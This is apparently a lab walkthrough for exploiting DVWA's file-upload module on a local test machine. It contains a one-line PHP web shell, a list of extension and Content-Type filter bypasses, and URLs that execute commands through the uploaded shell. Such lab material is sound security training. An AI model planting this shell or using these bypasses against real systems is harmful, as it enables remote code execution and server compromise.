# File Upload Bypass

## 🎯 Objective  
Attempt to upload a malicious file by bypassing client-side or server-side restrictions in a vulnerable file upload function.

---

## 📌 Target Info  
- **Target IP:** 192.168.56.105  
- **Service:** HTTP (Port 80)  
- **App Used:** DVWA (File Upload Module)  
- **Tools:** Web browser, Burp Suite (optional)

---

## 🧩 Steps

### 🔹 Step 1: Access the File Upload Page  
Navigate to:  
```
http://192.168.56.105/dvwa/vulnerabilities/upload/
```
Use **low security** level.

---

### 🔹 Step 2: Attempt Basic File Upload  
Try uploading a basic `.php` file with a payload:  
```php
<?php system($_GET['cmd']); ?>
```
If rejected, proceed to bypass methods.

---

### 🔹 Step 3: Bypass Filter Techniques
Change extension: Try .php5, .phtml, .phar

Use double extensions: shell.php.jpg
Tamper headers: Modify Content-Type in Burp Suite
Null byte injection: Try shell.php%00.jpg (if supported)

### 🔹 Step 4 Locate Uploaded File
Check uploads/ directory:
```
http://192.168.56.105/dvwa/hackable/uploads/shell.php
```
Test remote command execution:
```
http://192.168.56.105/dvwa/hackable/uploads/shell.php?cmd=whoami
```

---

✅ Conclusion
```
If the application accepts and executes the uploaded .php file, it is vulnerable to remote code execution through file upload bypass.
```
